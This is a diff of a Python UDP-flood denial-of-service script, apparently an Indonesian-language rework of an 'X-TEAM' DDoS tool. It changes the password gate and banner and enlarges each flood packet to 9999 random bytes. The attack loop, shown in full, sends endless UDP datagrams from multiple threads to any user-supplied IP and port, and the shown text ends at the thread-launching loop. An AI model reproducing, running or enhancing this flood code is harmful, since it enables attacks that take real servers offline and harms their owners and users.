@@ -459,57 +459,56 @@ except Exception as e:
 
 os.system("cls")
 #login tools
-password ="x-team"
+password ="220808"
 
 for i in range(3):
-	pwd = input("[•] Account : ")
+	pwd = input(" Type (220808): ")
 	j=3
 	if(pwd==password):
 		time.sleep(5)
-		print("[•] Please Wait!!! ")
+		print("Tunggu Beberapa Detik!!! ")
 		break
 	else:
 		time.sleep(5)
-		print("[×] Wrong Password!!! ")
+		print("Salah!,Kamu Typo ")
 		continue
 time.sleep(5)
-print("[+] Done Use Account \u001b[33mX-TEAM")
+print("Benar!!,Kamu Sudah Mengetik \u001b[33m220808")
 time.sleep(5)
 
 print("""
 \u001b[31m
-
-     > DDOS TOOLS UDP FLOOD
-     > AUTHOR : WIFA XY
-     > CODER : WIFA XY
-     CAN DOWN END NORMAL SERVER
-
-     Note : Jan Apus Codernya Kalo Apus Awto Blacklist
-
+▒█▀▀█ █░░█ █░░█ █░░█ ▒█▀▀▀█ █▀▀ █▀▀ 
 """)
-
-ip = str(input("   \u001b[31m[X] \u001b[37m@X-TEAM ════> Ip/Host :\u001b[31m  "))
+print("""
+\u001b[31m
+▒█░▄▄ █░░█ █▀▀█ █▀▀█ ░▀▀▀▄▄ █▀▀ █░░ 
+""")
+print("""\u001b[31m
+▒█▄▄█ ░▀▀▀ ▀░░▀ ▀░░▀ ▒█▄▄▄█ ▀▀▀ ▀▀▀
+""")
+ip = str(input("   \u001b[31m \u001b[37mIp/Host :\u001b[31m  "))
 time.sleep(3)
 print(" ")
-port = int(input("   \u001b[31m[Y] \u001b[37m@X-TEAM ════> Port Server :\u001b[31m  "))
+port = int(input("   \u001b[31m \u001b[37mPort Server :\u001b[31m  "))
 print(" ")
-times = int(input("   \u001b[31m[Z] \u001b[37m@X-TEAM ════> Connections :\u001b[31m  "))
+times = int(input("   \u001b[31m \u001b[37mConnections :\u001b[31m  "))
 print(" ")
-threads = int(input("   \u001b[31m[X] \u001b[37m@X-TEAM ════> Threading :\u001b[31m  "))
+threads = int(input("   \u001b[31m \u001b[37mThreading :\u001b[31m  "))
 time.sleep(3)
 
 # Attack
 def wt():
-	data = random._urandom(1800)
+	data = random._urandom(9999)
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(f"\u001b[33m [¥] @X-TEAM ════> \u001b[31mAttack To Ip \u001b[37m{ip} \u001b[31mOn Port \u001b[37m{port}")
+			print(f"\u001b[33mAttack To Ip \u001b[37m{ip} \u001b[31mOn Port \u001b[37m{port}")
 		except:
-			print(f"\u001b[33m [¥] @X-TEAM ════> \u001b[31mAttack To Ip \u001b[37m{ip} \u001b[31mOn Port \u001b[37m{port}")
+			print(f"\u001b[33mAttack To Ip \u001b[37m{ip} \u001b[31mOn Port \u001b[37m{port}")
 
 # Threads
 for y in range(threads):
